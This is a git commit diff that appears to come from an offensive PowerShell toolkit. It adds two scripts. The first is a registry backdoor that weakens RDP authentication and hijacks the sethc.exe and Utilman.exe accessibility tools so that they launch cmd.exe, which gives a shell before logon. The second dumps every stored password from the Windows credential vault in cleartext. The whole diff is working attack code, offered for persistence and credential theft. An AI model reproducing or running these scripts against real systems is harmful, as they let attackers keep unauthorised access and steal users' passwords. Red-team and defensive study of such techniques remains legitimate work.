fc7dcbaa5bc966ba9935ca4b919b306d1db4e17a
Nikhil "SamratAshok" Mittal <nikhil.uitrgpv@gmail.com>
2016-01-02 19:00:13 +0530

    Trimmed Invoke-MimkatzWDigestDowngrade

---
+++ Backdoors/Add-RegBackdoor.ps1
@@ -0,0 +1,20 @@
+﻿
+function Add-RegBackdoor
+{
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Payload = "cmd.exe"
+    )
+    
+    #Disable Network Level Authentication
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name SecurityLayer -Value 1
+    
+    
+    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value $Payload
+
+
+    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe"
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value $Payload
+}
---
+++ Gather/Get-WebCredentials.ps1
@@ -0,0 +1,9 @@
+﻿#Requires -Version 3
+#Script to retrieve web credentials from Windows vault
+#http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage
+function Get-WebCredentials.ps1
+{
+$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$VaultObj = new-object Windows.Security.Credentials.PasswordVault
+$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
+}
